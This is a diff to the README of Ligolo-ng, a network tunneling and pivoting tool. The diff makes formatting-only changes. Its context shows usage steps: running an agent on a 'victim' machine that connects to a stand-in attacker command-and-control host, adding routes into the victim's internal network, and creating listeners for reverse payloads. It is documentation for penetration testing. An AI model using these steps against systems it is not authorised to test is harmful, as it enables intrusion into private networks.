@@ -28,6 +28,7 @@ An advanced, yet simple, tunneling tool that uses a TUN interface.
     - [Using Let's Encrypt Autocert](#using-lets-encrypt-autocert)
     - [Using your own TLS certificates](#using-your-own-tls-certificates)
     - [Automatic self-signed certificates (NOT RECOMMENDED)](#automatic-self-signed-certificates-not-recommended)
+  - [Using Ligolo-ng](using-ligolo-ng)
   - [Agent Binding/Listening](#agent-bindinglistening)
 - [Demo](#demo)
 - [Does it require Administrator/root access ?](#does-it-require-administratorroot-access-)
@@ -78,6 +79,7 @@ This allows running tools like *nmap* without the use of *proxychains* (simpler 
 Precompiled binaries (Windows/Linux/macOS) are available on the [Release page](https://github.com/tnpitsecurity/ligolo-ng/releases).
 
 ### Building Ligolo-ng
+
 Building *ligolo-ng* (Go >= 1.17 is required):
 
 ```shell
@@ -131,8 +133,8 @@ The *proxy/relay* can automatically generate self-signed TLS certificates using 
 The `-ignore-cert` option needs to be used with the *agent*.
 
 > Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.
-### Using Ligolo-ng
 
+### Using Ligolo-ng
 
 Start the *agent* on your target (victim) computer (no privileges are required!):
 
@@ -144,21 +146,21 @@ $ ./agent -connect attacker_c2_server.com:11601
 
 A session should appear on the *proxy* server.
 
-``` 
+```
 INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
 ```
 
 Use the `session` command to select the *agent*.
 
 ```
-ligolo-ng » session 
+ligolo-ng » session
 ? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
 ```
 
 Display the network configuration of the agent using the `ifconfig` command:
 
 ```
-[Agent : nchatelain@nworkstation] » ifconfig 
+[Agent : nchatelain@nworkstation] » ifconfig
 [...]
 ┌─────────────────────────────────────────────┐
 │ Interface 3                                 │
@@ -174,18 +176,20 @@ Display the network configuration of the agent using the `ifconfig` command:
 Add a route on the *proxy/relay* server to the *192.168.0.0/24* *agent* network.
 
 *Linux*:
+
 ```shell
 $ sudo ip route add 192.168.0.0/24 dev ligolo
 ```
 
 *Windows*:
+
 ```
 > netsh int ipv4 show interfaces
 
 Idx     Mét         MTU          État                Nom
 ---  ----------  ----------  ------------  ---------------------------
  25           5       65535  connected     ligolo
-   
+
 > route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
 ```
 
@@ -193,7 +197,7 @@ Start the tunnel on the proxy:
 
 ```
 [Agent : nchatelain@nworkstation] » start
-[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
+[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation
 ```
 
 You can now access the *192.168.0.0/24* *agent* network from the *proxy* server.
@@ -214,7 +218,7 @@ In a ligolo session, use the `listener_add` command.
 The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.
 ```
 [Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
-INFO[1208] Listener created on remote agent!            
+INFO[1208] Listener created on remote agent!
 ```
 
 On the `proxy`:
@@ -230,7 +234,7 @@ This is very useful when using reverse tcp/udp payloads.
 You can view currently running listeners using the `listener_list` command and stop them using the `listener_stop [ID]` command:
 
 ```
-[Agent : nchatelain@nworkstation] » listener_list 
+[Agent : nchatelain@nworkstation] » listener_list
 ┌───────────────────────────────────────────────────────────────────────────────┐
 │ Active listeners                                                              │
 ├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
@@ -240,14 +244,12 @@ You can view currently running listeners using the `listener_list` command and s
 └───┴─────────────────────────┴────────────────────────┴────────────────────────┘
 
 [Agent : nchatelain@nworkstation] » listener_stop 0
-INFO[1505] Listener closed.                             
+INFO[1505] Listener closed.
 ```
 
 ## Demo
 
-
 https://user-images.githubusercontent.com/31402213/127328691-e063e3f2-dbd9-43c6-bd12-08065a6d260f.mp4
-
 
 ## Does it require Administrator/root access ?
 
@@ -269,16 +271,16 @@ $ iperf3 -c 10.10.0.1 -p 24483
 Connecting to host 10.10.0.1, port 24483
 [  5] local 10.10.0.224 port 50654 connected to 10.10.0.1 port 24483
 [ ID] Interval           Transfer     Bitrate         Retr  Cwnd
-[  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes       
-[  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes       
-[  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes       
-[  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes       
-[  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes       
-[  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes       
-[  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes       
-[  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes       
-[  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes       
-[  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes       
+[  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes
+[  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes
+[  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes
+[  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes
+[  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes
+[  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes
+[  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes
+[  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes
+[  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes
+[  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes
 - - - - - - - - - - - - - - - - - - - - - - - - -
 [ ID] Interval           Transfer     Bitrate         Retr
 [  5]   0.00-10.00  sec   127 MBytes   106 Mbits/sec    2             sender
